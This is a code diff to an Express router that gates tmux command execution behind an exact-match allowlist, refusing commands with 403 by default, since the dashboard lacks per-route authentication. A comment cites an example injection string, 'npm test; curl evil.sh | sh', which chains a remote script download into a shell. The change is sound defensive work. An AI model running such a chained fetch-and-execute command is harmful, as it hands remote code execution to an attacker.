@@ -19,6 +19,15 @@
  *
  * Disabled by default. Set AGENT_BOARD_ENABLE_TMUX=true to allow this router to
  * spawn processes — same opt-in shape as AGENT_BOARD_ENABLE_DOCKER_CONTROL.
+ *
+ * ── two independent gates ────────────────────────────────────────────────────
+ * AGENT_BOARD_ENABLE_TMUX           creates worktrees and empty tmux windows
+ * AGENT_BOARD_TMUX_ALLOWED_COMMANDS exact-match allowlist of runnable commands
+ *
+ * They are deliberately separate. The dashboard has no per-route authentication,
+ * so enabling the feature would otherwise hand arbitrary command execution to
+ * anyone who can reach the port. With the allowlist empty (the default) a
+ * `command` is refused with 403 and this route cannot execute anything at all.
  */
 import express from 'express';
 import { join } from 'path';
@@ -57,10 +66,22 @@ export function createWorktreesRouter({
   WORKTREE_ROOT = null,
   TMUX_ENABLED = false,
   TMUX_SESSION = DEFAULT_SESSION,
+  ALLOWED_COMMANDS = [],
   eventBus = null,
   logStructured = () => {},
 }) {
   const router = express.Router();
+  // Command execution is fail-closed and separate from the feature flag.
+  // AGENT_BOARD_ENABLE_TMUX alone lets callers create an isolated worktree and
+  // an empty window; it does NOT let them run anything. Sending a command
+  // additionally requires the operator to list it in
+  // AGENT_BOARD_TMUX_ALLOWED_COMMANDS. The dashboard has no per-route auth, so
+  // this allowlist — not the network boundary — is what bounds what a caller
+  // who can reach the port is able to execute.
+  const allowedCommands = new Set(
+    (Array.isArray(ALLOWED_COMMANDS) ? ALLOWED_COMMANDS : String(ALLOWED_COMMANDS || '').split(','))
+      .map(s => String(s).trim()).filter(Boolean)
+  );
   const worktreeRoot = WORKTREE_ROOT || (WORKSPACE_ROOT ? join(WORKSPACE_ROOT, '.worktrees') : null);
 
   const naming = {
@@ -150,7 +171,7 @@ export function createWorktreesRouter({
 
   router.get('/worktrees', async (req, res) => {
     if (!TMUX_ENABLED) {
-      return res.json({ success: true, enabled: false, worktrees: [], naming, tmuxAvailable: false });
+      return res.json({ success: true, enabled: false, worktrees: [], naming, tmuxAvailable: false, commandExecutionEnabled: false, allowedCommands: [] });
     }
     const { available, windows } = await listTmuxWindows();
     const gitWorktrees = await listGitWorktrees();
@@ -172,7 +193,12 @@ export function createWorktreesRouter({
         hasGitWorktree: !!entry,
       };
     });
-    res.json({ success: true, enabled: true, tmuxAvailable: available, worktrees, count: worktrees.length, gitWorktrees, naming });
+    res.json({
+      success: true, enabled: true, tmuxAvailable: available, worktrees,
+      count: worktrees.length, gitWorktrees, naming,
+      commandExecutionEnabled: allowedCommands.size > 0,
+      allowedCommands: [...allowedCommands],
+    });
   });
 
   router.post('/worktrees', async (req, res) => {
@@ -191,6 +217,25 @@ export function createWorktreesRouter({
     }
     if (command !== null && (typeof command !== 'string' || command.length > 2000)) {
       return res.status(400).json({ success: false, error: 'command must be a string under 2000 chars' });
+    }
+    // Exact match only. Prefix matching would be trivially bypassable —
+    // allowing "npm test" would also admit "npm test; curl evil.sh | sh",
+    // since tmux runs the string in a shell.
+    if (command !== null) {
+      if (allowedCommands.size === 0) {
+        return res.status(403).json({
+          success: false,
+          error: 'Command execution is disabled. Set AGENT_BOARD_TMUX_ALLOWED_COMMANDS to an explicit list of permitted commands to enable it. The worktree and window can still be created without a command.',
+        });
+      }
+      if (!allowedCommands.has(command)) {
+        logStructured('warn', 'worktree_command_rejected', { slug, command });
+        return res.status(403).json({
+          success: false,
+          error: 'command is not in AGENT_BOARD_TMUX_ALLOWED_COMMANDS (exact match required)',
+          allowedCommands: [...allowedCommands],
+        });
+      }
     }
 
     const branch = requestedBranch || branchNameFor(slug);
